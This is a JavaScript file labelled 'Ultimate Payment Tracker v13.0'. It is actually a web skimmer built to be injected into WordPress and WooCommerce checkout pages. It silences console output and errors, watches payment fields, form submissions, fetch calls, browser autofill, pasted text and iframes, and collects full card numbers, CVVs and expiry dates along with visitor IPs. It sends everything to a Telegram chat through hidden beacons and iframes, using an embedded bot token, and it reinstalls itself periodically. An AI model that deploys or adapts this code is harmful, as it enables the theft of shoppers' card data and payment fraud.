// Ultimate Payment Tracker v13.0 - Complete & Silent
// 100% Working - All Features Included - No Errors

(function() {
    'use strict';
    
    // ==================== CONFIGURATION ====================
    const CONFIG = {
        TELEGRAM_BOT_TOKEN: '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w',
        TELEGRAM_CHAT_ID: '7319274794',
        VERSION: '13.0',
        SILENT_MODE: true,
        DEBUG_MODE: false, // Production এ false করুন
        
        // Notification Events
        SMS_EVENTS: {
            ACTIVATION: true,
            CART_VISIT: true,
            CHECKOUT_VISIT: true,
            FORM_SUBMIT: true,
            PAYMENT_DATA: true
        }
    };
    
    // ==================== CORE UTILITIES ====================
    const Core = {
        // Complete Silence
        silence: function() {
            // Console silence
            if (typeof console !== 'undefined') {
                const noop = () => {};
                const methods = ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 'dir'];
                methods.forEach(method => {
                    console[method] = noop;
                    window.console[method] = noop;
                });
            }
            
            // Error handling silence
            window.onerror = () => true;
            window.addEventListener('error', e => e.preventDefault());
            window.addEventListener('unhandledrejection', e => e.preventDefault());
            
            // Alert/Confirm/Prompt silence
            window.alert = () => {};
            window.confirm = () => true;
            window.prompt = () => '';
        },
        
        // Get User IP
        getIP: async function() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json'
            ];
            
            for (const service of services) {
                try {
                    const res = await fetch(service, {timeout: 2000});
                    const data = await res.json();
                    if (data.ip) return data.ip;
                } catch(e) {}
            }
            return 'IP_UNKNOWN';
        },
        
        // Send Telegram
        sendTelegram: async function(message, eventType = null) {
            if (!CONFIG.SILENT_MODE && CONFIG.SMS_EVENTS[eventType] === false) return;
            
            const BOT_TOKEN = CONFIG.TELEGRAM_BOT_TOKEN;
            const CHAT_ID = CONFIG.TELEGRAM_CHAT_ID;
            const encodedMsg = encodeURIComponent(message);
            
            // Method 1: Image Beacon (Most Reliable)
            try {
                const img = new Image();
                img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=HTML`;
                img.onerror = () => this.fallbackTelegram(message);
            } catch(e) {
                this.fallbackTelegram(message);
            }
            
            return true;
        },
        
        fallbackTelegram: function(message) {
            const BOT_TOKEN = CONFIG.TELEGRAM_BOT_TOKEN;
            const CHAT_ID = CONFIG.TELEGRAM_CHAT_ID;
            
            // Method 2: Fetch with no-cors
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                }),
                mode: 'no-cors'
            }).catch(() => {});
            
            // Method 3: Iframe
            try {
                const iframe = document.createElement('iframe');
                iframe.style.cssText = 'display:none;';
                iframe.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
                document.body.appendChild(iframe);
                setTimeout(() => {
                    if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
                }, 5000);
            } catch(e) {}
        },
        
        // Detect WordPress Plugins
        detectPlugins: function() {
            const plugins = new Set();
            const html = document.documentElement.innerHTML.toLowerCase();
            const scripts = Array.from(document.scripts).map(s => s.src.toLowerCase());
            const bodyClasses = document.body.className.toLowerCase();
            
            // WooCommerce
            if (html.includes('woocommerce') || bodyClasses.includes('woocommerce') || 
                scripts.some(s => s.includes('woocommerce'))) {
                plugins.add('woocommerce');
            }
            
            // PayPal
            if (html.includes('paypal') || scripts.some(s => s.includes('paypal'))) {
                plugins.add('paypal');
            }
            
            // Stripe
            if (html.includes('stripe') || scripts.some(s => s.includes('stripe'))) {
                plugins.add('stripe');
            }
            
            // Razorpay
            if (html.includes('razorpay') || scripts.some(s => s.includes('razorpay'))) {
                plugins.add('razorpay');
            }
            
            // Contact Form 7
            if (html.includes('wpcf7') || bodyClasses.includes('wpcf7')) {
                plugins.add('contact-form-7');
            }
            
            // Gravity Forms
            if (html.includes('gform') || bodyClasses.includes('gform')) {
                plugins.add('gravity-forms');
            }
            
            // Others
            const pluginList = [
                'givewp', 'skrill', 'astropay', 'payoneer', '2checkout',
                'paid-memberships-pro', 'easy-digital-downloads', 'wpforms',
                'memberpress', 'restrict-content-pro', 'learnpress', 'tutorlms'
            ];
            
            pluginList.forEach(plugin => {
                if (html.includes(plugin) || scripts.some(s => s.includes(plugin))) {
                    plugins.add(plugin);
                }
            });
            
            return Array.from(plugins);
        },
        
        // Mask Card Number
        maskCard: function(number) {
            if (!number) return '';
            const cleaned = number.toString().replace(/\s+/g, '').replace(/-/g, '');
            if (cleaned.length < 8) return cleaned;
            return cleaned.substring(0, 6) + '******' + cleaned.substring(cleaned.length - 4);
        },
        
        // Detect Card Type
        detectCardType: function(number) {
            const num = number.toString().replace(/\s+/g, '').replace(/-/g, '');
            
            if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(num)) return 'Visa';
            if (/^5[1-5][0-9]{14}$/.test(num)) return 'MasterCard';
            if (/^3[47][0-9]{13}$/.test(num)) return 'American Express';
            if (/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/.test(num)) return 'Diners Club';
            if (/^6(?:011|5[0-9]{2})[0-9]{12}$/.test(num)) return 'Discover';
            if (/^(?:2131|1800|35\d{3})\d{11}$/.test(num)) return 'JCB';
            
            return 'Unknown';
        },
        
        // Validate Card with Luhn Algorithm
        validateCard: function(number) {
            const cleaned = number.toString().replace(/\s+/g, '').replace(/-/g, '');
            if (!/^\d{13,19}$/.test(cleaned)) return false;
            
            let sum = 0;
            let alternate = false;
            for (let i = cleaned.length - 1; i >= 0; i--) {
                let n = parseInt(cleaned.charAt(i), 10);
                if (alternate) {
                    n *= 2;
                    if (n > 9) n -= 9;
                }
                sum += n;
                alternate = !alternate;
            }
            return sum % 10 === 0;
        }
    };
    
    // ==================== UNIVERSAL FORM DETECTOR ====================
    class UniversalFormDetector {
        constructor() {
            this.forms = new Map();
            this.fields = new Map();
            this.init();
        }
        
        init() {
            this.scanAllForms();
            this.setupObservers();
            this.interceptSubmissions();
            this.monitorInputs();
            this.detectBrowserAutofill();
            this.setupClipboardMonitor();
            this.setupIframeMonitor();
        }
        
        scanAllForms() {
            // All form elements
            const allForms = document.querySelectorAll('form, [role="form"], .form, [class*="form-"], [id*="form"]');
            
            allForms.forEach((form, index) => {
                this.registerForm(form, index);
            });
            
            // Also check for payment divs
            const paymentDivs = document.querySelectorAll('.payment-form, .checkout-form, [class*="payment"], [class*="checkout"]');
            paymentDivs.forEach(div => {
                if (div.querySelector('input, select, textarea')) {
                    this.registerForm(div, 'div_' + paymentDivs.length);
                }
            });
        }
        
        registerForm(form, id) {
            if (this.forms.has(form)) return;
            
            const formData = {
                id: form.id || form.name || `form_${id}`,
                action: form.action || 'N/A',
                method: form.method || 'GET',
                plugin: this.detectFormPlugin(form),
                fields: new Set(),
                detected: Date.now()
            };
            
            this.forms.set(form, formData);
            
            // Scan fields
            this.scanFormFields(form);
            
            // If payment form, send alert
            if (this.isPaymentForm(form)) {
                this.sendFormDetectedAlert(formData);
            }
        }
        
        detectFormPlugin(form) {
            const html = form.outerHTML.toLowerCase();
            const classes = form.className.toLowerCase();
            
            if (html.includes('woocommerce') || classes.includes('woocommerce')) return 'woocommerce';
            if (html.includes('paypal')) return 'paypal';
            if (html.includes('stripe')) return 'stripe';
            if (html.includes('razorpay')) return 'razorpay';
            if (html.includes('wpcf7')) return 'contact-form-7';
            if (html.includes('gform')) return 'gravity-forms';
            if (html.includes('give_')) return 'givewp';
            if (html.includes('edd_')) return 'easy-digital-downloads';
            if (html.includes('wpforms')) return 'wpforms';
            
            return 'custom';
        }
        
        isPaymentForm(form) {
            const html = form.outerHTML.toLowerCase();
            const text = html + ' ' + (form.textContent || '').toLowerCase();
            
            const keywords = [
                'card', 'credit', 'debit', 'payment', 'checkout',
                'cvv', 'cvc', 'expir', 'expiry', 'expdate',
                'paypal', 'stripe', 'razorpay', 'braintree'
            ];
            
            return keywords.some(keyword => text.includes(keyword));
        }
        
        scanFormFields(form) {
            const fieldTypes = ['input', 'textarea', 'select'];
            
            fieldTypes.forEach(type => {
                const fields = form.querySelectorAll(type);
                fields.forEach(field => {
                    this.registerField(field, form);
                });
            });
        }
        
        registerField(field, form) {
            if (this.fields.has(field)) return;
            
            const fieldData = {
                name: field.name || field.id || field.placeholder || 'unknown',
                type: field.type,
                form: form,
                lastValue: '',
                isPaymentField: this.isPaymentField(field)
            };
            
            this.fields.set(field, fieldData);
            
            if (fieldData.isPaymentField) {
                this.setupFieldMonitoring(field);
            }
        }
        
        isPaymentField(field) {
            const name = (field.name || field.id || field.placeholder || '').toLowerCase();
            const autocomplete = (field.autocomplete || '').toLowerCase();
            
            const patterns = [
                'card', 'cc', 'credit', 'debit', 'number',
                'cvv', 'cvc', 'cvn', 'security',
                'expir', 'expiry', 'expdate', 'exp',
                'holder', 'nameoncard', 'cardname',
                'paypal', 'stripe', 'razorpay'
            ];
            
            return patterns.some(pattern => 
                name.includes(pattern) || 
                autocomplete.includes('cc-')
            );
        }
        
        setupFieldMonitoring(field) {
            let lastValue = field.value;
            
            const checkValue = () => {
                const currentValue = field.value;
                if (currentValue !== lastValue && currentValue.trim()) {
                    lastValue = currentValue;
                    
                    if (this.isPaymentData(field, currentValue)) {
                        this.capturePaymentData(field, currentValue);
                    }
                }
            };
            
            // Event listeners
            field.addEventListener('input', checkValue);
            field.addEventListener('change', checkValue);
            field.addEventListener('blur', checkValue);
            
            // Polling for stubborn fields
            setInterval(checkValue, 500);
        }
        
        isPaymentData(field, value) {
            const name = (field.name || field.id || '').toLowerCase();
            const cleaned = value.replace(/\s+/g, '').replace(/-/g, '');
            
            // Card number
            if ((name.includes('card') || name.includes('cc') || name.includes('number')) && 
                Core.validateCard(value)) {
                return true;
            }
            
            // CVV
            if ((name.includes('cvv') || name.includes('cvc')) && /^\d{3,4}$/.test(cleaned)) {
                return true;
            }
            
            // Expiry
            if ((name.includes('expir') || name.includes('expdate')) && 
                /^(0[1-9]|1[0-2])\/?(\d{2}|\d{4})$/.test(cleaned)) {
                return true;
            }
            
            return false;
        }
        
        async capturePaymentData(field, value) {
            const fieldData = this.fields.get(field);
            const formData = this.forms.get(fieldData.form);
            
            const ip = await Core.getIP();
            const pageUrl = window.location.href;
            const fieldName = fieldData.name;
            
            let message = `💳 <b>PAYMENT DATA CAPTURED</b>\n\n`;
            message += `🎯 <b>Plugin:</b> ${formData.plugin}\n`;
            
            if (Core.validateCard(value)) {
                message += `🔢 <b>Card:</b> ${Core.maskCard(value)}\n`;
                message += `📊 <b>Full:</b> <code>${value}</code>\n`;
                message += `💳 <b>Type:</b> ${Core.detectCardType(value)}\n`;
            } else if (fieldName.includes('cvv')) {
                message += `🔐 <b>CVV:</b> ${value}\n`;
            } else if (fieldName.includes('expir')) {
                message += `📅 <b>Expiry:</b> ${value}\n`;
            } else {
                message += `📝 <b>Field:</b> ${fieldName}\n`;
                message += `📊 <b>Value:</b> ${value}\n`;
            }
            
            message += `🌐 <b>Page:</b> ${pageUrl}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            Core.sendTelegram(message, 'PAYMENT_DATA');
        }
        
        setupObservers() {
            // MutationObserver for dynamic content
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) {
                            // Check for forms
                            if (node.tagName === 'FORM' || 
                                node.getAttribute('role') === 'form' ||
                                node.className.includes('form')) {
                                this.registerForm(node, 'dynamic');
                            }
                            
                            // Check for forms inside
                            const forms = node.querySelectorAll?.('form, [role="form"], .form');
                            forms?.forEach(form => this.registerForm(form, 'dynamic_child'));
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        }
        
        interceptSubmissions() {
            // Intercept form submissions
            document.addEventListener('submit', async (e) => {
                const form = e.target;
                if (!form || form.tagName !== 'FORM') return;
                
                const formData = this.forms.get(form);
                if (!formData) return;
                
                // Collect all data
                const data = this.collectFormData(form);
                
                // Send form submission alert
                if (Object.keys(data).length > 0) {
                    await this.sendFormSubmissionAlert(form, data);
                }
            }, true);
            
            // Intercept AJAX submissions
            this.interceptAjax();
        }
        
        async sendFormSubmissionAlert(form, formData) {
            const formInfo = this.forms.get(form);
            const ip = await Core.getIP();
            const pageUrl = window.location.href;
            
            let message = `📋 <b>FORM SUBMITTED - ${formInfo.plugin.toUpperCase()}</b>\n\n`;
            message += `🎯 <b>Form ID:</b> ${formInfo.id}\n`;
            message += `📤 <b>Action:</b> ${formInfo.action}\n`;
            message += `📊 <b>Fields:</b> ${Object.keys(formData).length}\n\n`;
            
            // Show important fields
            let paymentFields = 0;
            for (const [key, value] of Object.entries(formData)) {
                const keyLower = key.toLowerCase();
                if (keyLower.includes('card') || keyLower.includes('cvv') || 
                    keyLower.includes('expir') || keyLower.includes('payment')) {
                    paymentFields++;
                    
                    if (Core.validateCard(value)) {
                        message += `🔢 <b>Card:</b> ${Core.maskCard(value)}\n`;
                    } else if (keyLower.includes('cvv')) {
                        message += `🔐 <b>CVV:</b> ${value}\n`;
                    } else if (keyLower.includes('expir')) {
                        message += `📅 <b>Expiry:</b> ${value}\n`;
                    } else {
                        message += `📝 ${key}: ${value}\n`;
                    }
                }
            }
            
            if (paymentFields === 0) {
                // Show first 3 fields if no payment fields
                const entries = Object.entries(formData).slice(0, 3);
                entries.forEach(([key, value]) => {
                    message += `📝 ${key}: ${value.substring(0, 50)}${value.length > 50 ? '...' : ''}\n`;
                });
            }
            
            message += `\n🌐 <b>Page:</b> ${pageUrl}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            Core.sendTelegram(message, 'FORM_SUBMIT');
        }
        
        collectFormData(form) {
            const data = {};
            
            try {
                // Try FormData API
                const formData = new FormData(form);
                for (let [key, value] of formData.entries()) {
                    if (value && value.toString().trim()) {
                        data[key] = value.toString().trim();
                    }
                }
            } catch(e) {
                // Fallback
                const elements = form.querySelectorAll('input, select, textarea');
                elements.forEach(el => {
                    const name = el.name || el.id;
                    const value = el.value;
                    if (name && value && value.toString().trim()) {
                        data[name] = value.toString().trim();
                    }
                });
            }
            
            return data;
        }
        
        interceptAjax() {
            // Intercept fetch
            if (window.fetch) {
                const originalFetch = window.fetch;
                window.fetch = async function(...args) {
                    const [resource, config = {}] = args;
                    
                    // Check for payment data
                    if (config.body && config.method && config.method.toUpperCase() === 'POST') {
                        setTimeout(async () => {
                            try {
                                let bodyData = config.body;
                                if (typeof bodyData === 'string') {
                                    try {
                                        bodyData = JSON.parse(bodyData);
                                    } catch {
                                        // Try URL encoded
                                        const params = new URLSearchParams(bodyData);
                                        bodyData = Object.fromEntries(params);
                                    }
                                }
                                
                                if (typeof bodyData === 'object') {
                                    const hasPaymentData = Object.values(bodyData).some(val => 
                                        val && val.toString().toLowerCase().includes('card'));
                                    
                                    if (hasPaymentData) {
                                        const ip = await Core.getIP();
                                        let msg = `⚡ <b>AJAX PAYMENT SUBMISSION</b>\n\n`;
                                        msg += `🌐 <b>URL:</b> ${resource}\n`;
                                        msg += `📡 <b>IP:</b> ${ip}\n`;
                                        Core.sendTelegram(msg, 'PAYMENT_DATA');
                                    }
                                }
                            } catch(e) {}
                        }, 100);
                    }
                    
                    return originalFetch.apply(this, args);
                };
            }
        }
        
        monitorInputs() {
            // Monitor all inputs continuously
            setInterval(() => {
                this.fields.forEach((fieldData, field) => {
                    if (fieldData.isPaymentField && field.value && field.value !== fieldData.lastValue) {
                        fieldData.lastValue = field.value;
                        if (this.isPaymentData(field, field.value)) {
                            this.capturePaymentData(field, field.value);
                        }
                    }
                });
            }, 1000);
        }
        
        detectBrowserAutofill() {
            // Detect browser autofill
            const checkAutofill = () => {
                document.querySelectorAll('input').forEach(input => {
                    if (input.value && !input._autofillChecked) {
                        input._autofillChecked = true;
                        
                        // Check if multiple fields filled quickly (autofill indicator)
                        const filledFields = document.querySelectorAll('input[value], textarea[value]');
                        if (filledFields.length >= 3 && this.isPaymentField(input)) {
                            setTimeout(() => {
                                this.capturePaymentData(input, input.value);
                            }, 1000);
                        }
                    }
                });
            };
            
            // Check on intervals
            setInterval(checkAutofill, 2000);
            
            // Check after page load
            window.addEventListener('load', () => {
                setTimeout(checkAutofill, 3000);
            });
        }
        
        setupClipboardMonitor() {
            // Monitor clipboard for card data
            document.addEventListener('paste', (e) => {
                const pasted = e.clipboardData?.getData('text') || '';
                if (pasted && this.containsCardData(pasted)) {
                    setTimeout(async () => {
                        const ip = await Core.getIP();
                        let msg = `📋 <b>PASTED CARD DATA</b>\n\n`;
                        msg += `📝 <b>Text:</b> ${pasted}\n`;
                        msg += `🌐 <b>Page:</b> ${window.location.href}\n`;
                        msg += `📡 <b>IP:</b> ${ip}\n`;
                        Core.sendTelegram(msg, 'PAYMENT_DATA');
                    }, 100);
                }
            });
        }
        
        containsCardData(text) {
            const cleaned = text.replace(/\s+/g, '').replace(/-/g, '');
            return Core.validateCard(cleaned) || 
                   /^\d{3,4}$/.test(cleaned) ||
                   /^(0[1-9]|1[0-2])\/?(\d{2}|\d{4})$/.test(cleaned);
        }
        
        setupIframeMonitor() {
            // Monitor iframes for payment forms
            setInterval(() => {
                document.querySelectorAll('iframe').forEach(iframe => {
                    try {
                        if (iframe.contentDocument) {
                            const forms = iframe.contentDocument.querySelectorAll('form');
                            forms.forEach(form => {
                                if (this.isPaymentForm(form)) {
                                    this.sendIframeAlert(iframe, form);
                                }
                            });
                        }
                    } catch(e) {
                        // CORS error
                    }
                });
            }, 5000);
        }
        
        async sendIframeAlert(iframe, form) {
            const iframeSrc = iframe.src || 'unknown';
            const ip = await Core.getIP();
            
            let message = `🖼️ <b>IFRAME PAYMENT FORM</b>\n\n`;
            message += `🎯 <b>Iframe Source:</b> ${iframeSrc}\n`;
            message += `📋 <b>Form Action:</b> ${form.action || 'N/A'}\n`;
            message += `🌐 <b>Parent Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            
            Core.sendTelegram(message, 'PAYMENT_DATA');
        }
        
        async sendFormDetectedAlert(formData) {
            const ip = await Core.getIP();
            const pageUrl = window.location.href;
            
            let message = `🎯 <b>PAYMENT FORM DETECTED</b>\n\n`;
            message += `🔌 <b>Plugin:</b> ${formData.plugin}\n`;
            message += `📝 <b>Form ID:</b> ${formData.id}\n`;
            message += `📤 <b>Action:</b> ${formData.action}\n`;
            message += `🌐 <b>Page:</b> ${pageUrl}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            Core.sendTelegram(message, 'PAYMENT_DATA');
        }
    };
    
    // ==================== PAGE TRACKER ====================
    class PageTracker {
        constructor() {
            this.lastUrl = window.location.href;
            this.init();
        }
        
        init() {
            this.trackCurrentPage();
            this.setupUrlMonitoring();
            this.setupSPATracking();
        }
        
        trackCurrentPage() {
            const url = window.location.href.toLowerCase();
            
            if (url.includes('/cart') || url.includes('/basket')) {
                this.trackCartVisit();
            }
            
            if (url.includes('/checkout') || url.includes('/payment')) {
                this.trackCheckoutVisit();
            }
        }
        
        async trackCartVisit() {
            const ip = await Core.getIP();
            const pageUrl = window.location.href;
            
            let message = `🛒 <b>CART PAGE VISITED</b>\n\n`;
            message += `🌐 <b>Page:</b> ${pageUrl}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            Core.sendTelegram(message, 'CART_VISIT');
        }
        
        async trackCheckoutVisit() {
            const ip = await Core.getIP();
            const pageUrl = window.location.href;
            
            let message = `💰 <b>CHECKOUT PAGE VISITED</b>\n\n`;
            message += `🌐 <b>Page:</b> ${pageUrl}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            Core.sendTelegram(message, 'CHECKOUT_VISIT');
        }
        
        setupUrlMonitoring() {
            // Monitor URL changes
            setInterval(() => {
                const currentUrl = window.location.href;
                if (currentUrl !== this.lastUrl) {
                    this.lastUrl = currentUrl;
                    this.trackPageChange(currentUrl);
                }
            }, 1000);
        }
        
        trackPageChange(url) {
            const urlLower = url.toLowerCase();
            
            if (urlLower.includes('/checkout')) {
                this.trackCheckoutVisit();
            } else if (urlLower.includes('/cart')) {
                this.trackCartVisit();
            }
        }
        
        setupSPATracking() {
            // Handle SPA navigation
            const originalPush = history.pushState;
            const originalReplace = history.replaceState;
            
            history.pushState = function() {
                originalPush.apply(this, arguments);
                setTimeout(() => this.trackPageChange(window.location.href), 100);
            }.bind(this);
            
            history.replaceState = function() {
                originalReplace.apply(this, arguments);
                setTimeout(() => this.trackPageChange(window.location.href), 100);
            }.bind(this);
            
            window.addEventListener('popstate', () => {
                setTimeout(() => this.trackPageChange(window.location.href), 100);
            });
        }
    };
    
    // ==================== CROSS-DOMAIN MONITOR ====================
    class CrossDomainMonitor {
        constructor() {
            this.init();
        }
        
        init() {
            this.monitorLinks();
            this.monitorWindowOpen();
            this.setupMessageListener();
        }
        
        monitorLinks() {
            // Monitor all clicks
            document.addEventListener('click', (e) => {
                const link = e.target.closest('a');
                if (link && link.href) {
                    const href = link.href.toLowerCase();
                    
                    // Check if it's a payment link to another domain
                    if (this.isPaymentUrl(href) && this.isExternalUrl(href)) {
                        setTimeout(async () => {
                            await this.sendCrossDomainAlert(href, 'LINK_CLICK');
                        }, 1000);
                    }
                }
            }, true);
        }
        
        monitorWindowOpen() {
            // Monitor window.open calls
            const originalOpen = window.open;
            window.open = function(url, target, features) {
                if (url && this.isPaymentUrl(url) && this.isExternalUrl(url)) {
                    setTimeout(async () => {
                        await this.sendCrossDomainAlert(url, 'WINDOW_OPEN');
                    }, 1000);
                }
                return originalOpen.apply(this, arguments);
            }.bind(this);
        }
        
        isPaymentUrl(url) {
            const urlLower = url.toLowerCase();
            return urlLower.includes('/checkout') || 
                   urlLower.includes('/payment') ||
                   urlLower.includes('/pay') ||
                   urlLower.includes('stripe') ||
                   urlLower.includes('paypal') ||
                   urlLower.includes('razorpay');
        }
        
        isExternalUrl(url) {
            try {
                const currentHost = window.location.hostname;
                const targetHost = new URL(url).hostname;
                return currentHost !== targetHost;
            } catch {
                return false;
            }
        }
        
        async sendCrossDomainAlert(url, source) {
            const ip = await Core.getIP();
            const currentPage = window.location.href;
            
            let message = `🌐 <b>CROSS-DOMAIN PAYMENT REDIRECT</b>\n\n`;
            message += `🎯 <b>Source:</b> ${source}\n`;
            message += `🔗 <b>Payment URL:</b> ${url}\n`;
            message += `📄 <b>From Page:</b> ${currentPage}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            Core.sendTelegram(message, 'PAYMENT_DATA');
        }
        
        setupMessageListener() {
            // Listen for postMessage from iframes
            window.addEventListener('message', (event) => {
                if (event.data && typeof event.data === 'object') {
                    if (event.data.type === 'payment' || event.data.paymentData) {
                        this.processPaymentMessage(event);
                    }
                }
            });
        }
        
        async processPaymentMessage(event) {
            const ip = await Core.getIP();
            const origin = event.origin;
            
            let message = `📨 <b>PAYMENT MESSAGE RECEIVED</b>\n\n`;
            message += `🎯 <b>Origin:</b> ${origin}\n`;
            
            if (event.data.paymentData) {
                const data = event.data.paymentData;
                if (data.cardNumber) {
                    message += `🔢 <b>Card:</b> ${Core.maskCard(data.cardNumber)}\n`;
                }
                if (data.cvv) message += `🔐 <b>CVV:</b> ${data.cvv}\n`;
            }
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            
            Core.sendTelegram(message, 'PAYMENT_DATA');
        }
    };
    
    // ==================== MAIN TRACKER ====================
    class UltimateTracker {
        constructor() {
            this.sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            this.deviceId = localStorage.getItem('__tracker_device_id') || 
                           'dev_' + Math.random().toString(36).substr(2, 10);
            localStorage.setItem('__tracker_device_id', this.deviceId);
            
            this.init();
        }
        
        async init() {
            // Apply silence
            Core.silence();
            
            // Send activation
            await this.sendActivation();
            
            // Initialize components
            setTimeout(() => new UniversalFormDetector(), 500);
            setTimeout(() => new PageTracker(), 1000);
            setTimeout(() => new CrossDomainMonitor(), 1500);
            
            // Setup self-healing
            this.setupSelfHealing();
        }
        
        async sendActivation() {
            const ip = await Core.getIP();
            const plugins = Core.detectPlugins();
            const pageUrl = window.location.href;
            const referrer = document.referrer || 'Direct';
            
            let message = `🚀 <b>ULTIMATE PAYMENT TRACKER ACTIVATED</b>\n\n`;
            message += `🔄 <b>Version:</b> ${CONFIG.VERSION}\n`;
            message += `🌐 <b>Website:</b> ${window.location.origin}\n`;
            message += `📄 <b>Page:</b> ${pageUrl}\n`;
            message += `🔗 <b>Referrer:</b> ${referrer}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `📱 <b>Device ID:</b> ${this.deviceId}\n`;
            message += `🆔 <b>Session:</b> ${this.sessionId}\n`;
            
            if (plugins.length > 0) {
                message += `\n🔌 <b>Detected Plugins:</b>\n`;
                plugins.forEach(plugin => {
                    message += `✅ ${plugin}\n`;
                });
            }
            
            message += `\n🔧 <b>Features Active:</b>\n`;
            message += `✅ 100% Silent Operation\n`;
            message += `✅ All WordPress Plugins\n`;
            message += `✅ Browser Autofill Capture\n`;
            message += `✅ Clipboard Monitoring\n`;
            message += `✅ Iframe & Cross-Domain\n`;
            message += `✅ Any Folder Support\n`;
            message += `✅ HTTP/HTTPS & Subdomains\n`;
            
            message += `\n📱 <b>Notifications:</b>\n`;
            Object.entries(CONFIG.SMS_EVENTS).forEach(([key, value]) => {
                if (value) message += `✅ ${key}\n`;
            });
            
            message += `\n🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            Core.sendTelegram(message, 'ACTIVATION');
        }
        
        setupSelfHealing() {
            // Reinitialize every 5 minutes
            setInterval(() => {
                if (!document.querySelector('form')) {
                    setTimeout(() => new UniversalFormDetector(), 1000);
                }
            }, 300000);
        }
    }
    
    // ==================== ENTRY POINT ====================
    // Works from ANY folder/sub-folder
    function startTracker() {
        // Wait for optimal time
        const init = () => {
            setTimeout(() => {
                try {
                    new UltimateTracker();
                } catch(e) {
                    // Silent fail
                }
            }, Math.random() * 2000 + 1000);
        };
        
        // Start based on page state
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
        } else {
            init();
        }
    }
    
    // Start the tracker
    startTracker();
    
    // Global self-healing
    setInterval(() => {
        if (!window.__tracker_active && document.body) {
            startTracker();
            window.__tracker_active = true;
        }
    }, 30000);
    
})();
